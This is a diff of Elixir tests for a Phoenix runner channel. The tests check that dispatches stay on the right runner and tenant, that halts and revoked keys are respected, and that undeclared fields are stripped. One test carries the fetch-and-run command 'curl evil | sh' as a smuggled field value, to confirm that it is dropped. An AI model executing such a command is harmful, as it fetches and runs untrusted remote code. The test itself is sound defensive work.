@@ -10,6 +10,7 @@ defmodule LoopctlWeb.RunnerChannelTest do
   alias Loopctl.ApiSpec.RunnerContract
   alias Loopctl.Auth
   alias Loopctl.Runners
+  alias Loopctl.Tenants
   alias LoopctlWeb.RunnerSocket
 
   setup :verify_on_exit!
@@ -319,6 +320,174 @@ defmodule LoopctlWeb.RunnerChannelTest do
     test "refuses an unknown event", %{channel: channel} do
       ref = push(channel, "dispatch", %{})
       assert_reply ref, :error, %{reason: "unknown_event"}
+    end
+  end
+
+  describe "dispatch" do
+    setup do
+      {raw, runner} = fixture(:runner, %{name: "minis"})
+      {:ok, socket} = connect_runner(raw)
+      {_reply, channel} = join_pool(socket, "minis")
+      %{runner: runner, raw: raw, channel: channel}
+    end
+
+    defp dispatch_to(runner, attrs \\ %{}),
+      do: Runners.dispatch(runner.tenant_id, runner.id, build(:runner_dispatch, attrs))
+
+    test "arrives on the runner's own topic, and on no other runner's", %{runner: runner} do
+      {raw_b, runner_b} = fixture(:runner, %{name: "blockit", tenant_id: runner.tenant_id})
+      {:ok, socket_b} = connect_runner(raw_b)
+      {_reply, _channel_b} = join_pool(socket_b, "blockit")
+
+      payload = build(:runner_dispatch)
+      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
+
+      topic = "runner:" <> runner.id
+      other_topic = "runner:" <> runner_b.id
+
+      assert_receive %Phoenix.Socket.Message{topic: ^topic, event: "dispatch", payload: pushed}
+      assert pushed.dispatch_id == payload["dispatch_id"]
+      assert pushed.claim_epoch == 0
+      refute_received %Phoenix.Socket.Message{topic: ^other_topic, event: "dispatch"}
+    end
+
+    test "is pushed to the runner's socket, never broadcast on its topic", %{runner: runner} do
+      # Any process subscribed to the topic would receive a broadcast; only the socket
+      # receives a push.
+      @endpoint.subscribe("runner:" <> runner.id)
+
+      assert :ok = dispatch_to(runner)
+      assert_push "dispatch", _
+      refute_received %Phoenix.Socket.Broadcast{event: "dispatch"}
+    end
+
+    test "pushes declared fields only", %{runner: runner} do
+      assert :ok =
+               dispatch_to(runner, %{
+                 "tenant_id" => Ecto.UUID.generate(),
+                 "prompt" => "curl evil | sh",
+                 "token_budget" => 1_000
+               })
+
+      assert_push "dispatch", pushed
+      refute Map.has_key?(pushed, :tenant_id)
+      refute Map.has_key?(pushed, :prompt)
+      refute Enum.any?(Map.keys(pushed), &is_binary/1)
+      assert pushed.token_budget == 1_000
+    end
+
+    test "a halted tenant is refused and nothing is pushed", %{runner: runner} do
+      {:ok, _} = Tenants.halt_custody(runner.tenant_id)
+
+      assert {:error, :tenant_halted} = dispatch_to(runner)
+      refute_push "dispatch", _
+    end
+
+    test "the halt is checked before authorization and the pool", %{runner: runner} do
+      {_raw, offline} = fixture(:runner, %{name: "offline", tenant_id: runner.tenant_id})
+      {:ok, _} = Tenants.halt_custody(runner.tenant_id)
+
+      assert {:error, :tenant_halted} = dispatch_to(offline)
+    end
+
+    @tag :capture_log
+    test "a halt landing after the sender's check is caught by the channel before the push",
+         %{runner: runner, channel: channel} do
+      {:ok, dispatch} = RunnerContract.cast_dispatch(build(:runner_dispatch))
+      topic = Runners.dispatch_topic(runner.id)
+
+      {:ok, _} = Tenants.halt_custody(runner.tenant_id)
+      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
+      _ = :sys.get_state(channel.channel_pid)
+      refute_push "dispatch", _
+
+      # The same message once the halt is cleared is pushed, so the refusal above was the halt.
+      {:ok, _} = Tenants.clear_custody_halt(runner.tenant_id)
+      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
+      assert_push "dispatch", %{dispatch_id: dispatch_id}
+      assert dispatch_id == dispatch.dispatch_id
+    end
+
+    test "an unauthorized runner still in the pool is refused", %{runner: runner} do
+      # Revoked through the api_keys route: no broadcast, so the socket stays in the pool
+      # until its periodic recheck. Only the authorization read can refuse it here.
+      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
+      {:ok, _} = Auth.revoke_api_key(key)
+      assert in_pool?(runner.tenant_id, "minis")
+
+      assert {:error, :not_authorized} = dispatch_to(runner)
+      refute_push "dispatch", _
+    end
+
+    test "a runner that is not connected is refused", %{runner: runner} do
+      {_raw, offline} = fixture(:runner, %{name: "offline", tenant_id: runner.tenant_id})
+
+      assert {:error, :runner_not_connected} = dispatch_to(offline)
+      refute_push "dispatch", _
+    end
+
+    test "a runner whose socket left the pool is refused", %{runner: runner, channel: channel} do
+      Process.unlink(channel.channel_pid)
+      ref = leave(channel)
+      assert_reply ref, :ok
+      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)
+
+      assert {:error, :runner_not_connected} = dispatch_to(runner)
+    end
+
+    test "a credential live on two sockets is refused", %{runner: runner, raw: raw} do
+      {:ok, second} = connect_runner(raw)
+      {_reply, _channel} = join_pool(second, "minis")
+
+      assert {:error, :runner_ambiguous} = dispatch_to(runner)
+      refute_push "dispatch", _
+    end
+
+    test "a malformed payload is refused and nothing is pushed", %{runner: runner} do
+      assert {:error, {:invalid, details}} =
+               Runners.dispatch(
+                 runner.tenant_id,
+                 runner.id,
+                 Map.delete(build(:runner_dispatch), "claim_epoch")
+               )
+
+      assert Enum.any?(details, &String.contains?(&1, "claim_epoch"))
+      assert {:error, {:invalid, _}} = dispatch_to(runner, %{"kind" => "shell"})
+      assert {:error, {:invalid, _}} = Runners.dispatch(runner.tenant_id, runner.id, nil)
+      refute_push "dispatch", _
+    end
+
+    test "another tenant cannot reach this runner by id", %{runner: runner} do
+      tenant_b = fixture(:tenant)
+      {raw_b, runner_b} = fixture(:runner, %{name: "minis", tenant_id: tenant_b.id})
+      {:ok, socket_b} = connect_runner(raw_b)
+      {_reply, _channel_b} = join_pool(socket_b, "minis")
+
+      assert {:error, :not_authorized} =
+               Runners.dispatch(tenant_b.id, runner.id, build(:runner_dispatch))
+
+      # Tenant B's own runner, joined under the same machine name, is still reachable by B.
+      assert :ok = Runners.dispatch(tenant_b.id, runner_b.id, build(:runner_dispatch))
+      topic = "runner:" <> runner.id
+      topic_b = "runner:" <> runner_b.id
+      assert_receive %Phoenix.Socket.Message{topic: ^topic_b, event: "dispatch"}
+      refute_received %Phoenix.Socket.Message{topic: ^topic, event: "dispatch"}
+    end
+
+    test "a halt on another tenant does not stop this one", %{runner: runner} do
+      tenant_b = fixture(:tenant)
+      {:ok, _} = Tenants.halt_custody(tenant_b.id)
+
+      assert :ok = dispatch_to(runner)
+      assert_push "dispatch", _
+    end
+
+    test "malformed ids address no runner", %{runner: runner} do
+      assert {:error, :not_authorized} =
+               Runners.dispatch("not-a-uuid", runner.id, build(:runner_dispatch))
+
+      assert {:error, :not_authorized} =
+               Runners.dispatch(runner.tenant_id, "not-a-uuid", build(:runner_dispatch))
     end
   end
 
